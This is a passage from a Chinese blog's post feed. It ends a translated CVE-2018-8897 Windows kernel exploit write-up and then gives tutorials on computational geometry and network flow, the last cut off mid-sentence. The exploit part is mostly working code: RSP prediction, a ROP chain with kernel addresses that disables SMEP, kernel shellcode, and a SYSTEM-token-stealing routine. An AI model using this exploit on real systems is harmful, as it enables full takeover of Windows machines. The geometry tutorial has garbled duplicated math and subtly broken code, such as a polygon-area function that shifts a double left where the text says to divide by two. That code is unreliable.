执行RSP差异。该RSP增量将保持不变，因为控制流量也是恒定的。现在我们有了RSP增量，我们将预测RSP的下一个值，从中减去8来计算RtlCaptureContext的返回指针并使Prcb.Context.Xmm13 - Prcb.Context.Xmm15覆盖它。线程逻辑将如下所示：volatile PCONTEXT Ctx = *( volatile PCONTEXT* ) ( Prcb + Offset_Prcb__Context ); while ( !Ctx-&gt;Rsp ); // Wait for RtlCaptureContext to be called once so we get leaked RSP uint64_t StackInitial = Ctx-&gt;Rsp; while ( Ctx-&gt;Rsp == StackInitial ); // Wait for it to be called another time so we get the stack pointer difference // between sequential KiDebugTrapOrFault StackDelta = Ctx-&gt;Rsp - StackInitial; PredictedNextRsp = Ctx-&gt;Rsp + StackDelta; // Predict next RSP value when RtlCaptureContext is called uint64_t NextRetPtrStorage = PredictedNextRsp - 0x8; // Predict where the return pointer will be located at NextRetPtrStorage &amp;= ~0xF; *( uint64_t* ) ( Prcb + Offset_Prcb__Context ) = NextRetPtrStorage - Offset_Context__XMM13; // Make RtlCaptureContext write XMM13-XMM15 over it现在我们只需要设置一个ROP链并将其写入XMM13-XMM15。我们无法预测XMM15的哪一半会因为我们应用的掩码符合movaps对齐要求而受到打击，所以前两个指针应该只是指向一个[RETN]指令。我们需要加载一个具有我们选择设置CR4的值的寄存器，以便XMM14将指向一个[POP RCX; RETN]工具，然后是禁用SMEP的有效CR4值。至于XMM13，我们只是要使用[MOV CR4，RCX; RETN;]工具后跟一个指向我们shellcode的指针。最后的链看起来是这样的： - ＆retn ; （fffff80372e9502d） - ＆retn ; （fffff80372e9502d） - ＆pop rcx ; RETN; （fffff80372ed9122） - cr4_nosmep （00000000000506 f8） - ＆mov cr4，rcx ; RETN; （fffff803730045c7） - ＆KernelShellcode （00007 ff613fb1010）在我们的shellcode中，我们需要恢复CR4值，swapgs，回滚ISR堆栈，执行我们想要的代码和IRETQ回到用户模式，这可以像下面这样完成： NON_PAGED_DATA fnFreeCall k_ExAllocatePool = 0; using fnIRetToVulnStub = void( * ) ( uint64_t Cr4, uint64_t IsrStack, PVOID ContextBackup ); NON_PAGED_DATA BYTE IRetToVulnStub[] = { 0x0F, 0x22, 0xE1, // mov cr4, rcx ; cr4 = original cr4 0x48, 0x89, 0xD4, // mov rsp, rdx ; stack = isr stack 0x4C, 0x89, 0xC1, // mov rcx, r8 ; rcx = ContextBackup 0xFB, // sti ; enable interrupts 0x48, 0xCF // iretq ; interrupt return }; NON_PAGED_CODE void KernelShellcode() { __writedr( 7, 0 ); uint64_t Cr4Old = __readgsqword( Offset_Pcr__Prcb + Offset_Prcb__Cr4 ); __writecr4( Cr4Old &amp; ~( 1 &lt;&lt; 20 ) ); __swapgs(); uint64_t IsrStackIterator = PredictedNextRsp - StackDelta - 0x38; __writedr( 2, StackDelta ); __writedr( 3, IsrStackIterator ); // Unroll nested KiBreakpointTrap -&gt; KiDebugTrapOrFault -&gt; KiTrapDebugOrFault while ( ( ( ISR_STACK* ) IsrStackIterator )-&gt;CS == 0x10 &amp;&amp; ( ( ISR_STACK* ) IsrStackIterator )-&gt;RIP &gt; 0x7FFFFFFEFFFF ) { __rollback_isr( IsrStackIterator ); // We are @ KiBreakpointTrap -&gt; KiDebugTrapOrFault, which won&#39;t follow the RSP Delta if ( ( ( ISR_STACK* ) ( IsrStackIterator + 0x30 ) )-&gt;CS == 0x33 ) { /* fffff00e``d7a1bc38 fffff8007e4175c0 nt!KiBreakpointTrap fffff00e``d7a1bc40 0000000000000010 fffff00e``d7a1bc48 0000000000000002 fffff00e``d7a1bc50 fffff00ed7a1bc68 fffff00e``d7a1bc58 0000000000000000 fffff00e``d7a1bc60 0000000000000014 fffff00e``d7a1bc68 00007ff7e2261e95 -- fffff00e``d7a1bc70 0000000000000033 fffff00e``d7a1bc78 0000000000000202 fffff00e``d7a1bc80 000000ad39b6f938 */ IsrStackIterator = IsrStackIterator + 0x30; break; } IsrStackIterator -= StackDelta; } PVOID KStub = ( PVOID ) k_ExAllocatePool( 0ull, ( uint64_t )sizeof( IRetToVulnStub ) ); Np_memcpy( KStub, IRetToVulnStub, sizeof( IRetToVulnStub ) ); // ------ KERNEL CODE ------ .... // ------ KERNEL CODE ------ __swapgs(); ( ( ISR_STACK* ) IsrStackIterator )-&gt;RIP += 1; ( fnIRetToVulnStub( KStub ) )( Cr4Old, IsrStackIterator, ContextBackup ); }我们无法恢复任何寄存器，因此我们会让负责执行漏洞的线程将上下文存储在全局容器中，并从中恢复。现在我们执行了代码并返回到用户模式，我们的漏洞已经完成！让我们来做一个简单的演示，窃取系统令牌：uint64_t SystemProcess = *k_PsInitialSystemProcess; uint64_t CurrentProcess = k_PsGetCurrentProcess(); uint64_t CurrentToken = k_PsReferencePrimaryToken( CurrentProcess ); uint64_t SystemToken = k_PsReferencePrimaryToken( SystemProcess ); for ( int i = 0; i &lt; 0x500; i+= 0x8 ) { uint64_t Val = *( uint64_t * ) ( CurrentProcess + i ); Val &amp;= ~0xF; if ( Val == CurrentToken ) { *( uint64_t * ) ( CurrentProcess + i ) = SystemToken; break; } } k_PsDereferencePrimaryToken( CurrentToken ); k_PsDereferencePrimaryToken( SystemToken );该概念的完整实现可在以下网址找到：https://github.com/can1357/CVE-2018-8897]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>内核</tag>
        <tag>内核提权</tag>
        <tag>脚本</tag>
        <tag>乱搞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「计算几何」计算几何从入门到入土]]></title>
    <url>%2Farticles%2FComputed-geometry%2F</url>
    <content type="text"><![CDATA[这里我们来介绍一下计算几何的相关知识qwq计算几何是【真】初中内容qwq我们先来看看计算几何最重要的问题：精度问题精度控制计算几何经常牵扯到浮点数的运算，所以就会产生精度误差，因此我们需要设置一个 epsepseps（偏差值），一般取 10−710^{-7}10​−7​​ 到 10−1010^{-10}10​−10​​ 之间比如我们比较两个 double 类型的变量是否相等，我们就可以这样写123inline bool xxx (double first, double second) &#123; return abs(first - second) &lt; eps;&#125;点点是计算几何中常用的东西惹qwq我们一般通过表示坐标的方法进行描述12345struct Node &#123; double posx, posy; Node (double a = 0, double b = 0) : posx (a) , posy (b) &#123;&#125;&#125;两点距离两点距离是小学内容吧qwqA(x0,y0)A(x_0, y_0)A(x​0​​,y​0​​) 和 B(x1,y1)B(x_1,y_1)B(x​1​​,y​1​​) 的距离是 (x0−x1)2+(y0−y1)2\sqrt{(x_0-x_1)^2+(y_0-y_1)^2}√​(x​0​​−x​1​​)​2​​+(y​0​​−y​1​​)​2​​​​​代码实现：123inline double dis (const Node &amp;a, const Node &amp;b) &#123; return sqrt ( (a.posx - b.posx) * (a.posx - b.posx) + (a.posy - b.posy) * (a.posy - b.posy) );&#125;拓展对于 nnn 维的两个点 A(a1,a2,⋯,an)A(a_1, a_2,\cdots,a_n)A(a​1​​,a​2​​,⋯,a​n​​) 和 B(b1,b2,⋯,bn)B(b_1, b_2,\cdots,b_n)B(b​1​​,b​2​​,⋯,b​n​​) 的距离为dis=∑i=1n(ai−bi)2\text{dis}=\sqrt{\sum^{n}_{i=1}(a_i-b_i)^2}dis=​⎷​​​​​​​i=1​∑​n​​(a​i​​−b​i​​)​2​​​​​1/* 代码略 */中点对于点 A(x0,y0)A(x_0, y_0)A(x​0​​,y​0​​) , B(x1,y1)B(x_1,y_1)B(x​1​​,y​1​​) 的中点坐标为 P(x0+x12,y0+y12)P\left({x_0+x_1\over 2},{y_0+y_1\over 2}\right)P(​2​​x​0​​+x​1​​​​,​2​​y​0​​+y​1​​​​)123456Node mid (const Node &amp;a, const Node &amp;b) &#123; Node ans; ans.posx = (a.posx + b.posx) / 2; ans.posy = (a.posy + b.posy) / 2; return ans;&#125;向量有大小有方向的量qwq向量（vector）是一个有大小和方向的量，在几何中，它被表示为带箭头的线段。向量可以用起点和终点的坐标来表示如图就是几个向量向量 www 可以表示为 (−1−2)\begin{pmatrix}-1\\-2\end{pmatrix}(​−1​−2​​)通常用一对数 (a,b)(a,b)(a,b) 来表示 (ab)\begin{pmatrix}a\\b\end{pmatrix}(​a​b​​)1234struct vector &#123; double x,y; vector (double _x = 0, double _y = 0) : x(_x) , y(_y) &#123;&#125;&#125;不要和 stl 中的容器弄混惹qwq向量的模向量的模,即向量的长度对于 a=(xy)a=\begin{pmatrix}x\\y\end{pmatrix}a=(​x​y​​) 它的长度为 ∣a∣=x2+y2|a|=\sqrt{x^2+y^2}∣a∣=√​x​2​​+y​2​​​​​123double length (vector a) &#123; return sqrt (a.x * a.x + a.y * a.y);&#125;向量的运算我们要注意的是point−point=vector\text{point} - \text{point}=\text{vector}point−point=vectorpoint±vector=point\text{point}\pm\text{vector}=\text{point}point±vector=point1234vector operator + (vector a, vector b) &#123; return vector (a.x + b.x, a.y + b.y); &#125;vector operator - (vector a, vector b) &#123; return vector (a.x - b.x, a.y - b.y); &#125;vector operator * (vector a, double p) &#123; return vector (a.x * p, a.y * p); &#125;vector operator / (vector a. double p) &#123; return vector (a.x / p, a.y / p); &#125;向量的点积a⋅ba \cdot ba⋅b 的几何意义为 aaa 在 bbb 上的投影长度乘以 bbb 的模长a⋅b=∣a∣∣b∣cosθa\cdot b=|a||b|\cos \thetaa⋅b=∣a∣∣b∣cosθ , 其中 θ\thetaθ 为 aaa , bbb 之间的夹角两个向量 a,ba,ba,b 的夹角 θ\thetaθ 定义为从 aaa 旋转到 bbb 所经过的角度，逆时针为正，顺时针为负。a=(x0y0),b=(x1y1)⇒a⋅b=x0×x1+y0×y1a=\begin{pmatrix}x_0\\y_0\end{pmatrix},b=\begin{pmatrix}x_1\\y_1\end{pmatrix}\Rightarrow a\cdot b=x_0\times x_1+y_0\times y_1a=(​x​0​​​y​0​​​​),b=(​x​1​​​y​1​​​​)⇒a⋅b=x​0​​×x​1​​+y​0​​×y​1​​点积的应用若 a⊥ba \bot ba⊥b ，有 a⋅b=0a\cdot b=0a⋅b=0，反之亦然求两个向量的夹角，若 a⋅b&gt;0a\cdot b &gt;0a⋅b&gt;0，夹角为锐角，a⋅b&lt;0a\cdot b&lt;0a⋅b&lt;0 为钝角二维叉积两个向量的叉积是一个标量，a×ba\times ba×b 的几何意义为他们所形成的平行四边形的 有向面积a=(x0y0),b=(x1y1)⇒a×b=x0y1−x1y0a=\begin{pmatrix}x_0\\y_0\end{pmatrix}, b=\begin{pmatrix}x_1\\y_1\end{pmatrix} \Rightarrow a\times b=x_0y_1-x_1y_0a=(​x​0​​​y​0​​​​),b=(​x​1​​​y​1​​​​)⇒a×b=x​0​​y​1​​−x​1​​y​0​​123double cross (vector a, vector b) &#123; return a.x * b.y - a.y * b.x;&#125;叉积的作用直观理解，假如 bbb 在 aaa 的左边，则有向面积为正，假如在右边则为负。假如 b,ab,ab,a 共线，则叉积为 000所以叉积可以判断平行qwq向量的旋转a=(xy)a=\begin{pmatrix}x\\y\end{pmatrix}a=(​x​y​​) 可以看成是 x×(10)+y×(01)x\times \begin{pmatrix}1\\0\end{pmatrix}+y\times \begin{pmatrix}0\\1\end{pmatrix}x×(​1​0​​)+y×(​0​1​​)将其旋转 θ\thetaθ °，，，一些常用的方法点到直线的距离利用叉积求面积，然后除以平行四边形的底边长，得到平行四边形的高即点到直线的距离【真】小学内容qwq1234double point_vector_dist (point p, point a, point b) &#123; vector v = p - a; vector u = b - a; return fabs (cross (v, u)) / length (u);&#125;点到线段的距离比点到直线的距离稍微复杂如果平行四边形的高在区域之外的话就不合理，这时候需要计算点到距离较近的端点的距离1234567double point_dists (point p, point a, point b) &#123; if (a == b) return len(p - a); vector v1 = b - a, v2 = p - a, v3 = p - b; if (dot(v1,v2) &lt; 0) return len(v2); else if (dot(v1,v3) &gt; 0) return len(v3); return fabs(cross(v1,v2)) / len(v1);&#125;判断两个线段是否相交跨立实验判断一条线段的两端是否在另一条线段的两侧（两个端点与另一线段的叉积乘积为负）。需要正反判断两侧dcmp(double a) 是我们自己定义的一个函数，函数原型:1234int dcmp (double x) &#123; if (fabs(x) &lt; eps) return 0; else return x &lt; 0 ? -1 : 1;&#125;Code:12345bool segment (point a, point b, point c, point d) &#123; double c1 = cross(b - a, c - a), c2 = cross(b - a, d - a); double d1 = cross(d - c, a - c), d2 = cross(d - c, b - c); return dcmp(c1) * dcmp(c2) &lt; 0 &amp;&amp; dcmp(d1) * dcmp(d2) &lt; 0;&#125;判断点是否在多边形内部经典问题我们来看一个简单的栗子：这个画图软件已经标记出来了多边形的内部，我们来看看在程序中如何辨别：我们从这个点随便引一条射线，如果他与多边形有奇数个交点，就说明它在多边形内部如果他与多边形有偶数个交点，就说明他在多边形外部注意：这个多边形可能不是凸多边形！我们来看一个复杂的栗子:12345678910111213int point_in (point p, point *a, int n) &#123; int wn = 0, k, d1, d2; for (register int i = 1; i &lt;= n; i++) &#123; if (dcmp (dists(p, a[i], a[(i + 1 - 1) % n + 1])) == 0) return -1;//判断点是否在多边形的边界上 k = dcmp(cross(a[ (i + 1 - 1) % n + 1 ] - a[i], p - a[i])); d1 = dcmp(a[i].y - p.y); d2 = dcmp(a[ (i + 1 - 1) % n + 1 ].y - p.y); if (k &gt; 0 &amp;&amp; d1 &lt;= 0 &amp;&amp; d2 &gt; 0) wn++; if (k &lt; 0 &amp;&amp; d2 &lt;= 0 &amp;&amp; d1 &gt; 0) wn--; &#125; if (wn) return 1; else return 0; &#125;求任意多边形面积任取一个点进行三角剖分，用叉积求三角形的面积。因为叉积是有向面积，所以任意多边形都使用虽然我们加了很多没用的面积，但是我们会减掉（容斥），这就求出来面积了注意最后取绝对值这里注意一个十分zz的错误，我们最后的面积是要除以 222 的（惨痛的经历.wa123456double PolygonArea (Point *p, int n) &#123; double area = 0; for(register int i = 1; i &lt; n - 1; i++) area += Cross(p[i] - p[0], p[i + 1] - p[0]); return area &lt;&lt; 1;&#125;求多边形的重心同样方法将多边形三角剖分算出每个三角形的重心，套用质点组的重心公式即可质点组重心公式 三个点 A,B,CA,B,CA,B,Cx=ma×xa+mb×xb+mc×xcma+mb+mcx={m_a\times x_a+m_b\times x_b+m_c\times x_c\over m_a+m_b+m_c}x=​m​a​​+m​b​​+m​c​​​​m​a​​×x​a​​+m​b​​×x​b​​+m​c​​×x​c​​​​y=ma×ya+mb×yb+mc×ycma+mb+mcy={m_a\times y_a+m_b\times y_b+m_c\times y_c\over m_a+m_b+m_c}y=​m​a​​+m​b​​+m​c​​​​m​a​​×y​a​​+m​b​​×y​b​​+m​c​​×y​c​​​​mmm 表示权，三角形的有向面积这个还没有用到qwq（应该没有良心出题人会出这种题目吧qwq凸包凸包（Convex Hull\text{Convex Hull}Convex Hull）是一个计算几何（图形学）中的概念。在一个实数向量空间 VVV 中，对于给定集合 XXX ，所有包含 XXX 的凸集的交集 SSS 被称为 XXX 的凸包。我们使用通俗易懂的语言描述一下给定二维平面上的点集，凸包就是将最外层的点连接起来构成的凸多边型，它能包含点集中所有的点如图所示比如我们看这个图，这个图的凸包大概是这样的：凸包最常见的应用是求平面上距离最远的两个点，一般有两种算法来计算包含n个点的点集的凸包。这种两种算法都是按逆时针方向的顺序输出凸包Graham 算法时间复杂度为 O(nlog2n)O(n\log_2 n)O(nlog​2​​n) 。伪代码:Graham(Q)\text {Graham}(Q)Graham(Q)let p0 be the point in Q with the minimun y-coordinate\text {let } p_0 \text { be the point in } Q\text { with the minimun }y \text {-coordinate}let p​0​​ be the point in Q with the minimun y-coordinatelet&lt;p1,p2,⋯,pn&gt; be the remaining points in Qsort by polar angle in counterclockwise order around p0\begin{matrix}\text {let}&lt;p_1, p_2,\cdots,p_n&gt;\text { be the remaining points in } Q\\\text {sort by polar angle }\\\text { in counterclockwise order around }p_0\end{matrix}​let&lt;p​1​​,p​2​​,⋯,p​n​​&gt; be the remaining points in Q​sort by polar angle ​ in counterclockwise order around p​0​​​​push(p0,Stack)\text {push}(p_0,\text {Stack})push(p​0​​,Stack)push(p1,Stack)\text {push}(p_1, \text {Stack})push(p​1​​,Stack)push(p2,Stack)\text {push}(p_2,\text {Stack})push(p​2​​,Stack)for i in 3→n then\text {for }i\text { in } 3 \to n \text { then}for i in 3→n then pop(Stack)\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \text{pop}(\text{Stack}) pop(Stack) push (pi,Stack)\ \ \ \ \ \ \ \ \ \text{push }(p_i,\text{Stack}) push (p​i​​,Stack)return Stack\text{return Stack}return Stack这显然是不显然的（???我们来画几张较为显然的图来讲解一下qwq现在平面上有若干点组成的点集 GGG 。我们江他按照 AAA 极角排序:为什么按照A呢qwq因为凸包中坐标极值的点一定在凸包内（x,yx,yx,y 的 最大/最小 值），比如图中的 A,C,FA,C,FA,C,F 一定在凸包中这里我们就选择最左边的点惹qwq我们江 AAA 和按极角排序最小的点 DDD 连线建立一个栈，栈内只有两个元素 A,DA,DA,D我们连第一小和第二小的点 DFDFDF ，FFF 在 ADADAD 的左侧，于是使点 FFF 入栈我们按照这个过程进行下去，我们发现连接 FGFGFG 之后 GGG 在 FDFDFD 的右侧，我们就将 FFF 出栈，GGG 入栈按照以上步骤：这样就完成求这个点集的凸包了完成时栈的内容：[A,D,C,B][A,D,C,B][A,D,C,B]这个正好就是凸包的点，我们将他倒序输出就是顺时针凸包节点代码实现from:Menci-Blog123456789101112131415161718192021222324252627282930313233343536373839404142// 求凸包用的点int n;Pt a[MAXN + 1];// 凸包极角排序的比较函数inline bool compare(const Pt &amp;a, const Pt &amp;b)&#123; // 两个向量 Vec va = a - ::a[1], vb = b - ::a[1]; double t = cross(va, vb); if (!dcmp(t)) return t &gt; 0; // OA -&gt; OB 是逆时针，则 A 极角序在先 else return va.norm() &lt; vb.norm(); // norm 较小的长度较小&#125;struct Poly&#123; std::vector&lt;Pt&gt; pts;shixian // 求凸包（Convex），结果储存在自身 pts 中 void convex() &#123; // 找出最左下角的点 int id = 1; for (int i = 1; i &lt;= n; i++) &#123; if (a[i].x &lt; a[id].x || (a[i].x == a[id].x &amp;&amp; a[i].y &lt; a[id].y)) id = i; &#125; if (id != 1) std::swap(a[1], a[id]); // 排序 std::sort(a + 2, a + n + 1, &amp;compare); // 极角序扫描 pts.push_back(a[1]); for (int i = 2; i &lt;= n; i++) &#123; // 比较，如果最后一个点需要被删掉则弹出（pop_back） while (pts.size() &gt;= 2 &amp;&amp; cross(pts.back() - pts[pts.size() - 2], a[i] - pts.back()) &lt;= 0) pts.pop_back(); pts.push_back(a[i]); &#125; &#125;&#125;;作业【真】板子题最大土地面积题目我们可以 O(n4)O(n^4)O(n​4​​) 暴力枚举等等....我们好像学过另外一种求四边形面积的方法qwq我们发现可以枚举一条边，再以该边为对角线求出左右两边的三角形最大值我们又发现，好像最大的四边形的顶点都在凸包上！为什么会变成这样呢……两件快乐的优化重合在一起。而这两份优化，又给我带来更多的分数。得到的，本该是像梦境一般AC的时间……但是，为什么，我会被他们打死呢？首先，凸包是肯定要求的。受到之前的启发，我们仍然考虑枚举一条对角线，设现在枚举到的顶点为 i,ji, ji,j设另两个点为 a,ba, ba,b 。我们先来看 bbb 。首先，我们不难得出如果确定 i,ji,ji,j ，那 bbb 到 ijijij 的距离一定是单峰的。那如果 jjj 开始逆时针转动，峰显然也会逆时针转动（可以想象是整个凸包转过来了）于是我们让 bbb 逆时针跑就行了那 aaa 也同理我们发现 bbb 对每个点只扫了一遍，对于每个 iii 复杂度 O(n)O(n)O(n) ，同理 j,bj,bj,b 都是，所以总复杂度 O(n2)O(n^2)O(n​2​​) 。旋转卡壳其实无论是求凸包的最大直径也好，还是凸包上距离最远的两个点也好，都可以使用万能方法---枚举暴力来求解，但是枚举暴力的时间复杂度为 O(n2)O(n^2)O(n​2​​)，而接下来要介绍的卡壳法能够时间复杂度降到 O(n)O(n)O(n)顾名思义，就是通过一对平行线来卡住凸包上的两个相对的点，然后通过旋转这对平行线能够得到凸包上距离最远的一对点先来看一个直观图：如果这样直接去实现不太好实现我们可以转化一下，就是这一对平行线上在旋转的过程中我们可以让其中一条与凸包的一条边重合，此时另一条线的顶点是距这条边最远的点我们可以依次枚举每条边求得距离这条最远的顶点，然后计算这个顶点到边两个端点的距离并取较大的一个，枚举完成时得到的最大距离即为直径长度但是这样算的话因为枚举了所有边，每次又要枚举所有顶点，因此时间复杂度和暴力枚举一样。但是可以用下图观察到，当枚举的边逆时针旋转时，最远点也是跟着逆时针变化，这样我们可以不用每次枚举所有的顶点，直接从上次的最远点开始继续计算即可，此时复杂度为 O(n)O(n)O(n)。自己可以在纸上画下图模拟一下，就明白了计算点到直线的距离时没必要直接计算，我们知道最远的顶点和这条组成的三角形面积一定是最大的，所以可以直接计算三角形面积，而三角形面积可以用叉积来计算作业板子最大土地面积 - 旋转卡壳End.]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>计算几何</tag>
        <tag>数学</tag>
        <tag>向量</tag>
        <tag>凸包</tag>
        <tag>平面几何</tag>
        <tag>半平面交</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络流从入门到入土 - By Shq]]></title>
    <url>%2Farticles%2FNetwork-flow-start%2F</url>
    <content type="text"><![CDATA[网络流是个十分常用的方法，拥有很多用途之前的讲解太草率了qwq，这一篇我们来好好介绍一下网络流网络流 - 网络网络是一张有向图，有且仅有 一个汇点和一个源点我们来举一个 简单易懂 的栗子:你是一个工厂老板你有一座超大的工厂，大到它可以制造任意多的货物。但是众所周知，工厂是不会建在市区的。从工厂到销售处之间有若干车站，车站间有若干车次。每个车次有一个起点、一个终点（单向的），还有一个容量，指你最多可以利用个车次载多少货物。最大化你从工厂运到销售处的货物量这是一个很显然的栗子栗子中你的工厂就是源点，销售处(我们规定只有一个销售处)就是汇点画一个简单的图：By Shq + GeoGebra图中的 SSS 代表源点，TTT 代表汇点每条边表明了流量我们将⼀个合法解称作⼀个流，⼀条边被经过的次数称作其流量；最终运输的货物总数称作整个流的流量容量限制：每条边被经过的次数不得超过它的容量 →\to→ 每条边的流量不超过其流量流量平衡：流由若⼲从源点到汇点的路径组成 →\to→ 除源点和汇点外，对于每个点，流⼊它的流量和等于从它流出的流量和最⼤化货物量 →\to→ 最⼤化整个流的流量 →\to→ 最⼤化从源点流出的流量网络的一些性质网络流的性质有很多，这里先介绍一些常用的性质容量：capacity(e)\mathrm{capacity}(e)capacity(e) 表示一条有向边 e(u,v)e(u, v)e(u,v) 的最大允许的流量流量：flow(e)\mathrm{flow}(e)flow(e) 表示一条有向边 e(u,v)e(u, v)e(u,v) 总容量中已被占用的流量剩余容量：即 capacity(e)−flow(e)\mathrm{capacity}(e) - \mathrm{flow}(e)capacity(e)−flow(e)，表示当前时刻某条有向边 e(u,v)\mathrm{e}(u, v)e(u,v) 总流量中未被占用的部分反向边：原图中每一条有向边在残量网络中都有对应的反向边，反向边的容量为 ∞\infty∞，容量的变化与原边相反；『反向边』的概念是相对的，即一条边的反向边的反向边是它本身残量网络：在原图的基础之上，添加每条边对应的反向边，并储存每条边的当前流量。残量网络会在算法进行的过程中被修改增广路（augmenting path\mathrm{augmenting\ path}augmenting path）：残量网络中从源点到汇点的一条路径，增广路上所有边中最小的剩余容量为增广流量增广（augmenting\mathrm{augmenting}augmenting）：在残量网络中寻找一条增广路，并将增广路上所有边的流量加上增广流量的过程层次：level(u)\mathrm{level}(u)level(u) 表示节点 uuu 在层次图中与源点的距离层次图：在原残量网络中按照每个节点的层次来分层，只保留相邻两层的节点的图，满载（即流量等于容量）的边不存在于层次图中这里当然有一些 dinic 的内容，这里看看就好啦最大流现在我们想一种状况你工厂生产的产品十分畅销，销售部经常卖光，你每次都要制造产品，再运过去很麻烦。于是，你制造了 109+710^9+710​9​​+7 顿货物，但是由于每条边都有一个流量限制，到达销售部的货物肯定不会是你发出货物的数量你开始思考，我们最多生产多少顿货物，可以让销售部收到同样多的货物这个货物的数量就是这个网络的最大流我们先看一种 看似正确的 解法Shq 蒟蒻解法:找⼀条任意的路径并流过去，直到找不到一条合法的路径qwq我们来考虑一下反例：我们要求这个网络的最大流肉眼都能看出这个网络的最大流是 222我们沿用刚刚的思路，假如我们看到了这样一条路径:这个算法会有一个错误的答案 111我们想想如何改进这个算法，首先我们看一看我们失败的原因我们失败的原因是我们选择了一条错误的路径那个.....有什么办法可以 反悔 呢？如何做到 可以反悔 呢每次我们找到了道路后，我们可以建一条 反向边 ,容量为这条边的容量减少⼀条边上 kkk 的流量，相当于反向流过来 kkk 的流量这个还是⽐较显然的。假设你把⼀些货物从 xxx 地运到 yyy 地，后来你发现 运错了，那就再运回来就⾏了qwq定义: ⼀条边的残量，是指它还能流多少流量（即容量减去当前流量）这样，我们就又能发现一条道路！现在这个网络的最大流就显然是 222 了这条路径就叫做增广路 (augmenting path\mathrm{augmenting\ path}augmenting path)，当然，增广路不止这一条qwq最大流 - EK\text{EK}EK 算法我们来给这个简单显然的方法整理一下:Ford-Fulkerson-Method(G,S,T)\text {Ford-Fulkerson-Method}(G,S,T)Ford-Fulkerson-Method(G,S,T)initialize flowf to 0\text{initialize flow}f \text{ to } 0initialize flowf to 0 have an augmenting path \text{have an augmenting path }have an augmenting path ppp in\text{in}in GfG_fG​f​​ augment flow f along p\ \ \ \ \text{augment flow }f \text{ along } p augment flow f along preturn f\text{return }freturn f这明显就是贪心啊qwq我们来尝试证明一下：首先，对于 Ford-Fulkerson\text {Ford-Fulkerson}Ford-Fulkerson 算法求出的流为 fff ,fff 对应的残余网络中从 SSS 可达的顶点集合为 sss ，因为 fff 对应的残余网络中不存在从 S→TS\to TS→T的路径了那么显然，在残余网络中，任意一条从 § 中的边流量 f=cf=cf=c ,任意一条从反向弧 f=0f=0f=0 ，这个一定是满足，如果不满足，那么 sss 集合还可以扩充顶点，与前提矛盾。因此，§ 的割的容量等于流的大小。则可以证明裸的増广路 ford\text{ford}ford 算法是正确的最小割我们刚刚在证明的时候出现了一个十分神奇的 割 字，那么他到底是啥呢？所谓图的割，指的是某个顶点集合 sss 属于 vvv ，从 sss 出发的所有边的集合成为割 § ,这些边的容量和被称为割的容量，如果有源点 SSS 属于 sss ，汇点 TTT 属于 § ，则称之为 S−TS-TS−T 割，如果将 S−TS-TS−T 割的所有边都在原图中去掉，则不再有 S→TS\to TS→T的路径我们还是举个栗子：又双叒叕是这个图：你和某家工厂的老板有仇你想破坏他的工厂销售，但是明显的，你破坏工厂和销售部明显是不明智的，你可以破坏他工厂的运输即可qwq你需要找到一些 道路，使从工厂到销售部没有道路链接，但是你并非想花费很大力气，你想找到一些花费力气最小的道路，选出⼀些边的集合，使得删除它们之后从源点⽆法到达汇点，那么这个集合就叫做⼀个割这些边的容量之和称作这个割的容量我们任取一个割，我们发现它始终好像比最大流大的流量？从源点到汇点的每条路径都会经过割上的⾄少⼀条边。割掉这些边之后，把源点能到达的点放到左边，不能到达的放到右边。显然源点到汇点的流量不会超过从左边⾛向右边的次数，⽽这⼜不会超过从左边到右边的边的容量之和。直观⼀点，假设你是在⻋装着货物的时候炸掉了它。每个货物你⾄少付出 111 的代价炸掉（流量⼩于容量的时候你要付出⽐货物 数更多的代价），所以你炸的代价 不会⼩于 货物数对于一个网络我们可以直观的看出来从 SSS →\to→ TTT 的最大流是 888它的最小割为经过我们的实验发现，最小割的容量等于最大流的流量这个和最小割最大流有关，我们就干脆命名为 最小割最大流定理这意味着⼀个惊⼈的事实：你能够仅付出和货物数相同的代价，就把你的仇⼈的财路炸断！这自然是看起来很玄学的，我们想想为什么这个是成立的最小割最大流定理求证：最小割的容量等于最大流的流量，并且 FF\text{FF}FF 能够正确地求出来它考虑 FF\text{FF}FF 算法结束时，残量⽹络上没有了增⼴路。那么我们假设这时候，从源点经过残量⽹络能到达的点组成的集合为 XXX ，不能到达的点为 YYY 。显然汇点在 YYY ⾥，并且残量⽹络上没有从 XXX 到 YYY 的边。可以发现以下事实成⽴：YYY 到 XXX 的边流量为 000 。如果流量不为 000 那么应该存在⼀条从 XXX 到 YYY 的反向边，于是⽭盾。XXX 到 YYY 的边流量等于其容量。只有这样它才不会在残量⽹络中出现。根据第⼀个条件，我们可以得知：没有流量从 XXX 到 YYY 之后⼜回到了 XXX 。所以当前流量应该等于从 XXX 到 YYY 的边的流量之和，⽽根据第⼆个条件它⼜等于从 XXX 到 YYY 的边容量之和.⽽所有从 XXX 到 YYY 的边⼜构成⼀个割，其容量等于这些边的容量之和这意味着我们找到⼀个流和⼀个割，使得前者的流量等于后者的容量。⽽根据前⾯的结论，最⼤流的流量不会超过这个割的容量，所以这个流⼀定是最⼤流！同样的，最⼩割的容量也不会⼩于这个流的流量，所以这个割也⼀定是最⼩割。⽽这就是 FF\text{FF}FF ⽅法最后的局⾯（由于 FF\text{FF}FF 会终⽌，所以它必定求出这样⼀个局⾯），由此我们得出结论：FF是正确的，并且最大流等于最小割。 （⽽最⼩割最⼤流定理还可以通过线性规划对偶定理证明）不⽤管这个⻤玩意。证毕撒花.其他最大流算法窝就扔一个最大流板子的链接：[POJ]最大流板子我们发现 EK\text{EK}EK 算法的复杂度 O(nm2)O(nm^2)O(nm​2​​) 太⾼（虽然⽹络流⼏乎没有跑到上界的情况，但复杂度还是在⼀定程度上代表了算法效率）有⼀个显然的优化：如果增⼴⼀次之后发现最短路没有变化，那么可以继续增⼴；直到从源点到汇点的增⼴路增⼤，才需要再跑⼀遍 bfsbfsbfs 。bfsbfsbfs 之后，我们取出那些可能在最短路上的边，即 dis[to] = dis[from] + 1\text{dis[to] = dis[from] + 1}dis[to] = dis[from] + 1 的那些边。显然这些边构成的图中没有环。我们只需要沿着这种边尽可能的增⼴即可。我们利⽤ dfsdfsdfs 增广。有⼀个函数 int dfs(int x, int T, int maxflow) 表示从 xxx 出发寻找到汇点 TTT 的增广路，寻找到 maxflow\text{maxflow}maxflow 